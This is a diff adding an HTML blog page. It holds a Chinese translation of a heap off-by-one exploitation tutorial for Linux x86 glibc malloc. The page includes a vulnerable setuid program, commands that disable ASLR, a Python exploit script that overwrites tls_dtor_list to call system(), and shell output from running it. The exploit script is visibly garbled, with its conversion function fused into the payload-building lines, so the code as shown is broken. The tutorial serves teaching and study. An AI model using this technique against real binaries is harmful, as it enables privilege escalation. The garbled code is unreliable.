@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>堆内off-by-one漏洞利用 | Index of Computer System and Security</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="computer system, computer security" />
+  
+  
+  
+  
+  <meta name="description" content="作者: CSysSec出品
+
+CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。转载本文请务必注明，文章出处：《Linux(X86)漏洞利用系列-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆内off-by-one漏洞利用">
+<meta property="og:url" content="http://yoursite.com/20170104/heap-offbyone/index.html">
+<meta property="og:site_name" content="Index of Computer System and Security">
+<meta property="og:description" content="作者: CSysSec出品
+
+CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。转载本文请务必注明，文章出处：《Linux(X86)漏洞利用系列-">
+<meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png">
+<meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/heapoffbyone2.png">
+<meta property="og:updated_time" content="2017-01-04T14:40:15.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="堆内off-by-one漏洞利用">
+<meta name="twitter:description" content="作者: CSysSec出品
+
+CSysSec注： 本系列文章译自安全自由工作者Sploitfun的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在这里找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。转载本文请务必注明，文章出处：《Linux(X86)漏洞利用系列-">
+<meta name="twitter:image" content="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Index of Computer System and Security" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/hiero.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+<body>
+  <header id="allheader" class="site-header" role="banner">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            <a href="/" title="Index of Computer System and Security" rel="home">
+              Index of Computer System and Security</a>
+          </h1>
+          <div class="site-description">FROM 0 TO 1</div>
+
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+            <div class="clearfix sf-menu">
+
+              <ul id="main-nav" class="nmenu sf-js-enabled">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">首页</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/syssec">系统安全</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/architecture">体系结构</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/virtualization">虚拟化</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/malware">恶意代码</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/conferences">主流会议</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/academy">学术专家</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/celebrity">工业大咖</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/contribution">本站达人</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/donation">打赏支持</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+
+      </div>
+  </div>
+</header>
+
+
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-heap-offbyone" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      堆内off-by-one漏洞利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170104/heap-offbyone/" class="article-date">
+	  <time datetime="2017-01-04T14:35:27.000Z" itemprop="datePublished">一月 4, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heap-offbyone" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 什么是off-by-one漏洞</li>
+<li>0X02 如何做到任意代码执行</li>
+<li>0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖</li>
+<li>0X04 覆盖tls_dtor_list</li>
+<li>0X05 为什么没能获取root shell</li>
+</ul>
+</blockquote>
+<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">栈内off-by-one漏洞</a><br>    <a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">深入理解glibc malloc</a></p>
+<p><u>VM Setup</u>: Fedora 20(x86)</p>
+<h3 id="0X01-什么是off-by-one漏洞"><a href="#0X01-什么是off-by-one漏洞" class="headerlink" title="0X01 什么是off-by-one漏洞"></a>0X01 什么是off-by-one漏洞</h3><p>在<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">这篇</a>文中说过，当将源字符串拷贝到目的字符串时出现下述情况可能会发生off-by-one</p>
+<ul>
+<li>源字符串长度等于目的字符串长度</li>
+</ul>
+<p>当源字符串长度等于目的字符串长度时，单个NULL字节会被拷贝到目的字符串中。这里由于目的字符串处于堆中，单个NULL字节可以覆盖下一个chunk的头部信息,从而导致任意代码执行。</p>
+<p><u>扼要重述</u>：在<a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">这篇</a>文中说过，堆根据每个用户对堆内存的请求，被分为多个chunk.每个chunk有自己的chunk头部信息(由<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1108" target="_blank" rel="external">malloc_chunk</a>表示)。 结构体malloc_chunk含有以下四个域：</p>
+<ul>
+<li>1.prev_size - 若前一个chunk空闲，则prev_size域包含前一个chunk的大小信息；若前一个chunk已经被分配，则这个域包含前一个chunk的用户数据</li>
+<li>2.size: size域含有这个已经分配的chunk。域的后3比特含有flag信息。<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1267" target="_blank" rel="external">PREV_INUSE(P)</a>- 当前一个chunk被分配时，此位被设置</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1274" target="_blank" rel="external">IS_MMAPPED(M)</a>- 当chunk被mmap了，此位被设置。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1283" target="_blank" rel="external">NON_MAIN_ARENA(N)</a>- 当这个chunk属于一个线程arena时，此位被设置。</li>
+</ul>
+</li>
+<li>3.fd- 指向同一个bin中的下一个chunk</li>
+<li>4.bk- 指向同一个bin中的前一个chunk</li>
+</ul>
+<p><u>漏洞代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//consolidate_forward.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 16</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line"> <span class="keyword">int</span> fd = open(<span class="string">"./inp_file"</span>, O_RDONLY); <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"File open error\n"</span>);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">1020</span>) &#123; <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Buffer Overflow Attempt. Exiting...\n"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">-2</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">char</span>* tmp = <span class="built_in">malloc</span>(<span class="number">20</span><span class="number">-4</span>); <span class="comment">/* [3] */</span></div><div class="line"> <span class="keyword">char</span>* p = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">char</span>* p2 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [5] */</span></div><div class="line"> <span class="keyword">char</span>* p3 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [6] */</span></div><div class="line"></div><div class="line"> read(fd,tmp,SIZE); <span class="comment">/* [7] */</span></div><div class="line"> <span class="built_in">strcpy</span>(p2,argv[<span class="number">1</span>]); <span class="comment">/* [8] */</span></div><div class="line"></div><div class="line"> <span class="built_in">free</span>(p); <span class="comment">/* [9] */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>编译命令</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -o consolidate_forward consolidate_forward.c</div><div class="line">$sudo chown root consolidate_forward</div><div class="line">$sudo chgrp root consolidate_forward</div><div class="line">$sudo chmod +s consolidate_forward</div></pre></td></tr></table></figure>
+<p><u>注意</u>: 为了更好演示，已经关闭ASLR。如果你也想绕过ASLR，可以利用<a href="http://www.csyssec.org/20170104/useafterfree/" target="_blank" rel="external">这篇文章</a>提到的信息泄露漏洞或暴力破解技术<br>。</p>
+<p><strong>注：本系列所有文章中第[N]行代码指的的代码中显示/*[N]*/的位置。</strong></p>
+<p>上述漏洞程序的第[2]和[8]行就是堆中off-by-one溢出可能发生的地方。目的缓冲区的长度是1020，因此源缓冲区长度也是1020的话就会导致任意代码执行。</p>
+<h3 id="0X02-如何做到任意代码执行"><a href="#0X02-如何做到任意代码执行" class="headerlink" title="0X02 如何做到任意代码执行"></a>0X02 如何做到任意代码执行</h3><p>当单NULL字节覆盖下一个chunk(‘p3’)的chunk头部信息时就会发生任意代码执行。当1020字节的chunk(‘p2’)被单字节溢出时，是下一个chunk(‘p3’)头部大小的最小影响字节(Least Significant Byte)-(而不是prev_size的最小影响字节)被NULL字节覆盖。</p>
+<h3 id="0X03-为什么不是prev-size的最小影响字节-LSB-被覆盖"><a href="#0X03-为什么不是prev-size的最小影响字节-LSB-被覆盖" class="headerlink" title="0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖"></a>0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖</h3><p>由于需要额外的空间来存储malloc_chunk以及为了对其的目的，<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1254" target="_blank" rel="external">checked_request2size</a>将用户需求的大小转化为可用的大小(内部表示字节大小-internal representation size)。当可用大小的最后3个比特都没有被设置时会发生这种转化，这3个比特用来存储flag信息 P,M与N。</p>
+<p>上漏洞代码执行到malloc(1020)时，1020字节的用户需求大小被转化为((1020 + 4 + 7) &amp; ~7) 1024字节(内部表示字节大小)。分配1020字节的chunk开销只要4字节。但对于一个分配的chunk我们却需要8字节的chunk头部信息用来存储prev_size和size信息。1024字节的chunk前8个字节用作chunk头部信息，但现在只剩下1016（1024-8）字节（而不是1020字节)用来存储用户数据。如上面说的prev_size的定义，如果前一个chunk(‘p2’)被分配，chunk(‘p3’)的prev_size域含有用户数据。chunk(‘p3’)的prev_size紧邻已经分配的chunk(‘p2’)，其含有用户数据剩下的4字节。这就是为什么size(而不是pre_size)的LSB被但NULL字节覆盖的原因了。</p>
+<p><u>堆布局</u>:</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoffbyone1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p><u>注意</u>: 上图中的攻击者数据指的是下文中提到的”覆盖 tls_dtor_list”</p>
+<p>现在回到我们一开始的问题</p>
+<pre><code>如何做到任意代码执行
+</code></pre><p>现在我们已经知道在off-by-one漏洞中，单NULL字节覆盖下一个chunk(‘p3’) size域的LSB。单NULL字节覆盖意味着chunk(‘p3’)的flag信息被清除了。 被覆盖的chunk(‘p2’)尽管处于已经被分配的状态，现在却变得空闲了。当在溢出的chunk (‘p2)前的(‘p’)被释放时，这种状态不一致性驱使glibc去unlink 已经处于分配状态的chunk(‘p2’)  </p>
+<p>在<a href="http://www.csyssec.org/20170104/heapoverflow-unlink/" target="_blank" rel="external">这篇</a>文章中，由于任何四字节的内存区域都能被写上攻击者的数据，unlink一个已经在分配状态的chunk会导致任意代码执行<br>！！ 在同一篇文中，我们也知道由于glibc近些年的被强化，unlink技术已经过时了！ 尤其是当<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1414" target="_blank" rel="external">“损坏的双链表”</a>这个条件成立时，任意代码执行是不可能的。</p>
+<p>在2014年后期，<a href="http://googleprojectzero.blogspot.in/2014/08/the-poisoned-nul-byte-2014-edition.html" target="_blank" rel="external"> google’s project zero team</a>发现一种通过unlink一个大的chunk(large chunk)的方法，可以成功绕过”损坏的双链表”条件。</p>
+<p><u>Unlink</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123; </span></div><div class="line">  FD = P-&gt;fd; </div><div class="line">  BK = P-&gt;bk;</div><div class="line">  <span class="comment">// Primary circular double linked list hardening - Run time check</span></div><div class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) <span class="comment">/* [1] */</span></div><div class="line">   malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); </div><div class="line">  <span class="keyword">else</span> &#123; </div><div class="line">   <span class="comment">// If we have bypassed primary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!</span></div><div class="line">   FD-&gt;bk = BK; <span class="comment">/* [2] */</span></div><div class="line">   BK-&gt;fd = FD; <span class="comment">/* [3] */</span></div><div class="line">   <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size) </div><div class="line">   &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; </div><div class="line">    <span class="comment">// Secondary circular double linked list hardening - Debug assert</span></div><div class="line">    assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);  <span class="comment">/* [4] */</span></div><div class="line">        assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); <span class="comment">/* [5] */</span></div><div class="line">    <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123; </div><div class="line">     <span class="keyword">if</span> (P-&gt;fd_nextsize == P) </div><div class="line">      FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; </div><div class="line">     <span class="keyword">else</span> &#123; </div><div class="line">      FD-&gt;fd_nextsize = P-&gt;fd_nextsize; </div><div class="line">      FD-&gt;bk_nextsize = P-&gt;bk_nextsize; </div><div class="line">      P-&gt;fd_nextsize-&gt;bk_nextsize = FD; </div><div class="line">      P-&gt;bk_nextsize-&gt;fd_nextsize = FD; </div><div class="line">     &#125; </div><div class="line">    &#125; <span class="keyword">else</span> &#123; </div><div class="line">     <span class="comment">// If we have bypassed secondary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!</span></div><div class="line">     P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; <span class="comment">/* [6] */</span></div><div class="line">     P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; <span class="comment">/* [7] */</span></div><div class="line">    &#125; </div><div class="line">   &#125; </div><div class="line">  &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在glibc malloc中，主环形双链表由malloc_chunk的fs和bk域来维护，而次环形双链表由malloc_chunk的fd_nextsize和bk_nextsize域来维护。这看起来像是损坏的双链表hardening被应用到了主环形双链表(第[1]行)和次环形双链表中(第[4],[5]行)，但次要环形双链表的hardening仅仅是一个debug assert语句(不像是主环形双链表hardening会在运行时进行检查)，它最终并不会编译到产品中(至少在fedora是这样的)。次要环形双链表的强化(hardening)（第[4],[5]行)并没有什么意义，这可以让我们在4字节的内存区域中写任何数据(第[6],[7]行)。</p>
+<p>任然还有一些东西要讲明白一些。我们来看看如何通过unlink一个大的chunk来做到任意代码执行的细节！ 现在攻击者已经控制住即将要被释放的大chunk，他以下方式覆盖malloc_chunk中的域：</p>
+<ul>
+<li>fd必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>bk也必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>fd_nextsize 必须指向 free_got_addr -0x14</li>
+<li>bk_nextsize 必须指向system_addr</li>
+</ul>
+<p>但第[6],[7]行需要fd_nextsize和bk_nextsize是可写的。fd_nextsize指向 free_got_addr -0x14，所以它是可写的。但bk_nextsize指向system_addr，这属于libc.so的text段区域，所以它是不可写的。要让fd_nextsize和bk_nextsize同时可写，需要覆盖tls_dtor_list</p>
+<h3 id="0X04-覆盖tls-dtor-list"><a href="#0X04-覆盖tls-dtor-list" class="headerlink" title="0X04 覆盖tls_dtor_list"></a>0X04 覆盖tls_dtor_list</h3><p><a href="">tls_dtor_list</a>是一个线程本地变量，含有一个函数指针列表，在执行exit()时会被调用。 <a href=""> __call_tls_dtors]()遍历tls_dtor_list并一个一个调用其中的函数！！ 所以如果我们能利用一个含有system和system_arg的堆地址覆盖tls_dtor_list，来替换dtor_list</a>中的func和obj， system()就能被调用。</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoffbyone2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoffbyone2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>现在攻击者通过以下方式覆盖即将要释放的大chunk中的malloc_chunk里面的域信息：</p>
+<ul>
+<li>fd必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>bk也必须指回到已经被释放的chunk地址来绕过主环形双链表的hardening</li>
+<li>fd_nextsize 必须指向 tls_dtor_list -0x14</li>
+<li>bk_nextsize 必须指向含有dtor_list元素的堆地址</li>
+</ul>
+<p>让fd_nextsize变成可写的问题解决了。那是因为tls_dtor_list属于libc.so的可写段，并且通过反汇编_call_tls_dtors()，可以得到tls_dtor_list的地址是0xb7fe86d4</p>
+<p>由于bk_nextsize指向堆地址，让它变成可写的问题也解决了。</p>
+<p>利用所有这些信息，我们可以写个漏洞利用程序来攻击’consolidate_forward’了！！</p>
+<p><u>漏洞利用代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#exp_try.py</div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fd = <span class="number">0x0804b418</span></div><div class="line">bk = <span class="number">0x0804b418</span></div><div class="line">fd_nextsize = <span class="number">0xb7fe86c0</span></div><div class="line">bk_nextsize = <span class="number">0x804b430</span></div><div class="line">system = <span class="number">0x4e0a86e0</span></div><div class="line">sh = <span class="number">0x80482ce</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num(fd)</div><div class="line">buf += conv(bk)</div><div class="line">buf += conv(fd_nextsize)</div><div class="line">buf += conv(bk_nextsize)</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(sh)</div><div class="line">buf += <span class="string">"A"</span> * <span class="number">996</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./consolidate_forward"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上述漏洞利用代码，并不能给我们root shell。它只能提供运行在我们自己权限上的bash shell。 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python -c 'print "A"*16' &gt; inp_file</div><div class="line">$ python exp_try.py </div><div class="line">Calling vulnerable program</div><div class="line">sh-4.2$ id</div><div class="line">uid=1000(sploitfun) gid=1000(sploitfun) groups=1000(sploitfun),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</div><div class="line">sh-4.2$ exit</div><div class="line">exit</div><div class="line">$</div></pre></td></tr></table></figure>
+<h3 id="0X05-为什么没能获取root-shell"><a href="#0X05-为什么没能获取root-shell" class="headerlink" title="0X05 为什么没能获取root shell"></a>0X05 为什么没能获取root shell</h3><p>当uid!=euid时，/bin/bash会丢弃权限。我们的二进制文件’consolidate _forward’的真实uid=1000，有效uid=0。 由于真实uid!=有效uid，因此当system() 被调用时，bash会丢弃权限。为了解决这个问题，我们需要在执行system()之前调用setuid(0)，由于_call_tls_dtors遍历tls_dtor_list并一个一个调用其中的函数，我们需要链接setuid()和system()</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heap-offbyone" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+        
+	<div id="comment">
+	
+	<!-- 多说评论框 start -->
+	 <div class="ds-thread" data-thread-key="/20170104/heap-offbyone/" data-title="堆内off-by-one漏洞利用" data-url="http://yoursite.com/20170104/heap-offbyone/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"csyssec"};
+	  (function() {
+	    var ds = document.createElement('script');
+	    ds.type = 'text/javascript';ds.async = true;
+	    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	    ds.charset = 'UTF-8';
+	    (document.getElementsByTagName('head')[0] 
+	     || document.getElementsByTagName('body')[0]).appendChild(ds);
+	  })();
+	  </script>
+	<!-- 多说公共JS代码 end -->
+	
+	</div>
+	<link rel="stylesheet" href="/css/comment.css">
+
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/20170104/maleficarum/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
